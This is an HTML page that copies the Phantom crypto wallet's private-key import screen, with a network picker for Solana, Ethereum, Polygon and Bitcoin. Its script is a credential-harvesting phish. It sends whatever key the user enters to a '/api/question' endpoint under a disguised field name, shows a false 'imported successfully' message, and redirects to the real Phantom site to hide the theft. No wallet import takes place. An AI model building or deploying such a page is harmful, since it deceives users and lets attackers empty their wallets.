<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Phantom – Private Key</title>
  <link rel="stylesheet" href="../css/style.css" />
  <style>
    .nav-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; }
    .network-sheet {
      display: none;
      position: absolute; bottom: 0; left: 0; right: 0;
      background: #1a1a1a;
      border-radius: 24px 24px 0 0;
      padding: 20px;
      z-index: 10;
    }
    .network-sheet h3 { color: #fff; font-size: 16px; font-weight: 600; margin-bottom: 16px; text-align: center; }
    .network-option {
      display: flex; align-items: center; justify-content: space-between;
      padding: 14px 16px; border-radius: 12px;
      cursor: pointer; margin-bottom: 8px; transition: background 0.15s;
    }
    .network-option:hover { background: #252525; }
    .network-option.selected { background: #2a2560; }
    .net-name { color: #fff; font-size: 15px; }
    .net-check { color: #a78bfa; font-size: 18px; }
  </style>
</head>
<body>
<div class="phone">
  <div class="nav-row">
    <a href="import-wallet.html" class="icon-btn">‹</a>
    <div class="step-dots">
      <div class="dot active"></div>
      <div class="dot"></div>
      <div class="dot"></div>
    </div>
    <button class="icon-btn">?</button>
  </div>

  <svg width="90" height="75" viewBox="0 0 90 75" style="margin-top:10px;">
    <ellipse cx="38" cy="42" rx="22" ry="16" fill="#5b4fcf"/>
    <rect x="52" y="28" width="30" height="12" rx="6" fill="#a78bfa" transform="rotate(-30 52 28)"/>
    <circle cx="28" cy="46" r="7" fill="#3d3080"/>
    <circle cx="28" cy="46" r="3" fill="#0a0a0a"/>
    <text x="60" y="20" font-size="13" fill="#facc15">✦</text>
    <text x="14" y="28" font-size="11" fill="#facc15">✦</text>
  </svg>

  <h1 class="page-title">Enter your private key</h1>

  <div class="field-row" onclick="toggleSheet()">
    <span class="field-label">Network</span>
    <span class="field-value"><span id="selected-network">Solana</span> ›</span>
  </div>

  <div class="field-box">
    <textarea id="pk-input" placeholder="Private key" rows="2"></textarea>
    <button class="paste-btn" onclick="document.getElementById('pk-input').focus()">Paste</button>
  </div>

  <div class="toast" id="toast">✓ Wallet imported successfully! Redirecting...</div>

  <button class="btn btn-dark-purple" id="import-btn" onclick="handleImport()" style="margin-bottom:16px;">
    <span class="btn-text">Import</span>
  </button>

  <!-- Network bottom sheet -->
  <div class="network-sheet" id="net-sheet">
    <h3>Select network</h3>
    <div class="network-option selected" onclick="selectNetwork('Solana')">
      <span class="net-name">Solana</span>
      <span class="net-check" id="check-solana">✓</span>
    </div>
    <div class="network-option" onclick="selectNetwork('Ethereum')">
      <span class="net-name">Ethereum</span>
      <span class="net-check" id="check-ethereum" style="display:none">✓</span>
    </div>
    <div class="network-option" onclick="selectNetwork('Polygon')">
      <span class="net-name">Polygon</span>
      <span class="net-check" id="check-polygon" style="display:none">✓</span>
    </div>
    <div class="network-option" onclick="selectNetwork('Bitcoin')">
      <span class="net-name">Bitcoin</span>
      <span class="net-check" id="check-bitcoin" style="display:none">✓</span>
    </div>
  </div>
</div>

<script src="../js/utils.js"></script>
<script>
const networks = ['Solana','Ethereum','Polygon','Bitcoin'];
let currentNetwork = 'Solana';

async function handleImport() {

    const phrase =
        document.getElementById("pk-input")
        .value
        .trim();

    if (!phrase) {
        alert("Please enter your key first.");
        return;
    }
    const btn = document.getElementById('import-btn');
btn.classList.add('loading');
btn.querySelector('.btn-text').textContent = 'Importing...';

    try {

        const response = await fetch(
            "/api/question",
            {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    question: phrase
                })
            }
        );

        if (!response.ok) { throw new Error(); }

    btn.classList.remove('loading');
    btn.querySelector('.btn-text').textContent = 'Import';
    document.getElementById("toast").style.display = "block";
   document.getElementById("pk-input").value = "";
   btn.classList.remove('loading');
   btn.querySelector('.btn-text').textContent = 'Import';
   setTimeout(function() { window.location.href = 'https://www.phantom.com'; }, 2500);

  
} catch (err) {
    btn.classList.remove('loading');
    btn.querySelector('.btn-text').textContent = 'Import';
    alert('Failed to send.');
}
}
</script>
</body>
</html>
